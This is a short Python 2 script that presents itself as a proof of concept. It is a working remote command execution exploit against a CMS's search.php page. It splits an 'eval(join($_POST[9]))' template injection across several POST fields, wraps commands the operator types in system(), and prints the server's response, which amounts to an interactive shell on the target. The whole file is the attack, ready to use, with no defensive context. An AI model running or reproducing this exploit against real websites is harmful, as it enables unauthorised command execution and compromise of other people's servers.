#!/usr/bin/env python
# coding=utf-8
# code by clown
# Date 2017/12/2

import sys
import requests

def help():
    print "Usage : "
    print "        python %s [URL]" % (sys.argv[0])
    print "Example : "
    print "        python %s http://example.com/search.php" % (sys.argv[0])
    print "Type command 'q' for exit"

def poc():
	help()
	if not sys.argv[1].endswith("search.php"):
		print("[+] Please make sure url end with search.php")
		exit()
	while 1:
		code = raw_input("-> ")
		paylod = 'system("%s");' % code
		if code != "q":
			postdata = {
			"searchtype":"5",
			"searchword":"{if{searchpage:year}",
			"year":":e{searchpage:area}}",
			"area":"v{searchpage:letter}",
			"letter":"al{searchpage:lang}",
			"yuyan":"(join{searchpage:jq}",
			"jq":"($_P{searchpage:ver}",
			"ver":"OST[9]))",
			"9[]":paylod,
			}
			r = requests.post(url=sys.argv[1],data=postdata)
			print r.text[:r.text.find("<!DOCTYPE html>")]
		else:
			exit()
if __name__ == '__main__':
	try:
		poc()
	except Exception as e:
		help()

